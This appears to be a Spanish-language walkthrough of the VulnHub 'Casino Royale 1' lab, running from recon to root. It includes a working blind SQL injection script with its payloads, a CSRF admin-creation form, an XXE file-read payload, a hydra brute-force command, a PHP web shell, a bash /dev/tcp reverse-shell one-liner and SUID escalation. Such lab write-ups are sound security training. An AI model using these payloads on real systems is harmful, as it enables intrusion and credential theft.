
---
- Tags: #vulhub #CasinoRoyale 
---

- **Máquina Casino Royale 1**: [https://www.vulnhub.com/entry/casino-royale-1,287/](https://www.vulnhub.com/entry/casino-royale-1,287/)

## Reconocimiento:

### Arp-scan

Escaneamos la tarjeta de red para ver cual es la ip de la máquina:
```bash 
arp-scan -I ens33 --localnet
```
### Ping
```
ping -c 1 192.168.18.237
```

### Nmap

Ejecutamos el comando como administrador.
Descubrimos los puertos abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.237 -oG allPorts
```

Una vez descubiertos los puertos, ejecutamos una serie de scripts sobre los puertos. *En este caso: 21, 25, 80, 8081*

```bash
nmap -sC -sV -p21,25,80,8081 192.168.18.237 -oN Targgeted
```

Normalmente, dentro de los scripts predeterminado que usa nmap esta el *ftp-anon.nse* y como no nos ha dado ningún feedback, podemos concluir que el usuario *aanonymous* no esta disponible en el servicio ftp del puerto 21.

Con *ctrl + shift + t* abrimos otro espacio de trabajo mientras realizamos el scaneo. y con *ctrl + shift + alt + t* nombramos escaneo y reconocimiento, *ctrl + shift + w* para cerrar solo el espacio de trabajo actual.

```bash
nmap --script http-enum -p21,25,80,8081 192.168.18.237 -oN webScan 
```
Este script actua como un fuzzer

### Whatweb
Ejecutamos el comando whatweb para ver que esta empleando la máquina.
```bash
whatweb http://192.168.1.146 -v
```

Deberian salir versiones desactualizadas o propensas a ataques. Hay que documentarlo.

### Página web

Encontramos un directorio *install/* en la parte de reconocimiento que parece vulnerable, al buscar en *searchsploit* podemos ver que la versión que tenemos, la *0.13* es justamente vulnerable a un Cookie Handling.
```bash
searchsploit -x php/webapps/6766.txt
```

Gracias el exploit, encontramos un *pokeradmin/* hacemos un *ctrl + shift + c* en el navegador y en la consola pegamos la línea para "setear" la cookie de admin. A continuación nos metemos en *pokeradmin/configure.php* y deberíamos tener acceso a todo.
```bash
javascript:document.cookie = "ValidUserAdmin=admin";
```

Con esto, ya tendriamos acceso, sin embargo vamos a abrir el burpsuite e interceptar la petición para ver si logramos cambiar la contraseña. 
El formulario de inicio de sesión es vulnerable a SQLi, tras aplicarle un *admin' or 1=1-- -* nos deja entrar, y después de realizar un *admin' order by 7-- -* podemos deducir que hay 7 columnas. 
Con las igualdades nos da unos problemas la página, al dar por válida tambien un *1=2-- -* con lo cuál nos montaremos un script en python de un SQLi basada en tiempo. Con comparaciones como la siguiente:
```bash
op=adminlogin&username=admin' and if(substr(database(),1,1)='a',sleep(5),1)-- -&password=admin
```

A la hora de montar el script, es necesario poner una cabecera llamada *Content-Type* porque si no la página no lo interpreta.

```python
#!/usr/python3

from pwn import *
import requests, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.18.237/pokeradmin/index.php"
characters = string.ascii_lowercase + string.digits + ":,_-."

def sqli():
    
    data = " "

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for position in range (1, 12):
        for character in characters:

            post_data = {
                'op': 'adminlogin',
                'username': "admin' and if(substr(database(),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
                'password': 'admin'
            }

                
            p1.status(post_data['username'])

            time_start = time.time()
            r = requests.post(main_url, data=post_data, headers=headers)
            time_end = time.time()

            if time_end - time_start > 0.85:

                data += character
                p2.status(data)
                break

    p1.success("Inyeccion SQL completada exitosamente")
    p2.success(data)
    

if __name__=='__main__':
    sqli()
```
con este script podemos sacar la palabra *pokerleague* y con algunos pequeños cambios en el script sacamos mas información, para las bases de datos cambiamos la linea 32 y 37.
```python
'username': "admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Datos extraidos:  information_schema,mysql,performance_schema,phpmyadmin,pokerleague,vip*

```python
'username': "admin' and if(substr((select group_concat(table_name) from information_schema.table where table_schema='pokerleague'),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Datos extraidos:  pokermax_admin,pokermax_players,pokermax_scores,pokermax_tournaments*

```python
'username': "admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Datos extraidos: id,username,password,league_name,league_information,league_email,league_tournament_director* Los que nos interesan son username y password

```python
'username': "admin' and if(substr((select group_concat(username,0x3a,password) from pokermax_admin),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
```
*Datos extraidos: admin:raise12million* (Esta contraseña no es válida por ftp) 
Cuando rebuscamos un poco de información en *Manage Players* encontramos a Valenka con una ruta (http://casino-royale.local/vip-client-portfolios/?uri=blog) que intenta cargar cosas del *casino-royale.local*, para que aparezcan las imágenes añadimos la ip de la máquina y la ruta de casino-royale.local al /etc/hosts.
Una vez que todo carga vemos unas instrucciones para mandarle un correo a Valenka, con el asunto de un cliente conocido.
Nos conectamos por telnet al puerto 25 que estaba abierto y empezamos a probar. No hay ningún tipo de verificación de correo. Asi que aprovechamos para montarnos un servidor en python por el puerto 80 y le mandamos un correo a ver si lo abre y nos sale.
```bash
telnet 192.168.18.237 25
Trying 192.168.18.237...
Connected to 192.168.18.237.
Escape character is '^]'.
220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
MAIL FROM: test@test.com
250 2.1.0 Ok
RCPT TO: valenka
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: obanno

Esto es una prueba:
http://mi_ip/test.html
.
250 2.0.0 Ok: queued as A65D21D05
```
En pocos segundos obtenemos una petición en el servidor del puerto 80, indicandonos que valenka abrió el Mail y que podemos proceder a hacer un pequeño script en .html. Además si buscamos en searchsploit el CMS actual del nuevo directorio (http://casino-royale.local/vip-client-portfolios/?uri=blog) encontramos un Cross-Site Request Forgery (CSRF) por html.

```html
<html>
  <body>
    <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST">
      <input type="hidden" name="emailAddress" value="victor@victor.com" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="victor" />
      <input type="hidden" name="newPassword" value="victor123" />
      <input type="hidden" name="confirmPassword" value="victor123" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>
```
Ahora solo hay que conectarse otra vez y mandarle el archivo html.

Una vez que con el html conseguimos nuestro propio usuario de administrador, podemos encontrar en la información de otro perfil llamado le, otra ruta del sistema que parece estar vulnerable a un xml. Cosa que podemos deducir por una filtración en el código fuente de la nueva página. (http://casino-royale.local//ultra-access-view/main.php).
Para el xxe, abrimos la página web de Portswigger y el burpsuite, inteceptamos la petición del servidor vulnerable al xxe y cogemos la siguiente instrucción de Portswigger junto con la información que ya teniamos que se filtro de la página web en el código fuente y se la pegamos en el repeater para ver por ejemplo el */etc/passwd*.
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<creds>
 <customer>
	&xxe;
 </customer>
 <password>
	victor123
 </password>
</creds>
```
Al ver todo el */etc/passwd* no encontramos con un *ftpUserULTRA* que nos podria ser útil, pero no conocemos su contraseña. Podemos tirar de hydra y de Rockyou para realizar un ataque de fuerza bruta, llegando a la contraseña: *bankbank* en el puesto 48698 del diccionario.
```bash
hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.18.237 -t 20
```

Al conectarnos por ftp podemos subir un archivo .php para ejecutar comandos con el parámetro cmd.
```php
<?php
  system($_GET['cmd']);
?>
```
Para subir el archivo tiene que ser php3 porque si no el servidor ftp lo bloquea.
Una vez que esta subido el archivo le damos el permiso 777 y desde la url podremos controlar el parámetro cmd.
```
http://casino-royale.local/ultra-access-view/cmd.php3?cmd=whoami
```

Nos ponemos en escucha por el puerto 443 desde la máquina atacante y creamos un *oneliner* en la url. Recuerda url-encodear los "&" con "%26".
```
http://casino-royale.local/ultra-access-view/cmd.php3?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.18.226/443%200%3E%261%22
```

Una vez que la máquina víctima nos manda una bash al 443, le aplicamos un tratamiento de la tty
```bash
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bashs
stty rows 44 columns 184

```

### Escalado de privilegios
Normalmente en servidores asi, existen unos archivos config que almacenan información sensible, asi que filtramos con find dichos archivos, para que realize un cat a todos los archivos que encuentre usamos un poco de sintaxis de find.
```bash
find -name \*config\* 2>/dev/null -exec cat {} \; | less -S -r
```

En un archivo de config encontramos una contraseña para el usuario valenka : *11archives11!*
Existe un usuario valenka al que nos podemos conectar con un user-pivoting debido a una reutilización de credenciales.

Y para terminar buscamos desde la raíz archivos con privilegios SUID.
```bash
find / -perm -4000 2>/dev/null
```
Encontramos este archivo casualmente sospechoso que intenta ejecutar un script en bash: */opt/casino-royale/mi6_detect_test* 
Asi que vamos a un directorio temporal, creamos el archivo y le damos permisos de ejecución.
```bash
#!/bin/bash

bash -p
```

Una vez estamos como root, vamos al directorio de la flag q curiosamente es un servicio web con lo cuál nos montamos un servicio web con php por cualquier puerto para compartir el index.php de la carpeta de la flag.
```bash
php -S 0.0.0.0:8084
```

![[Pasted image 20260922120359.png]]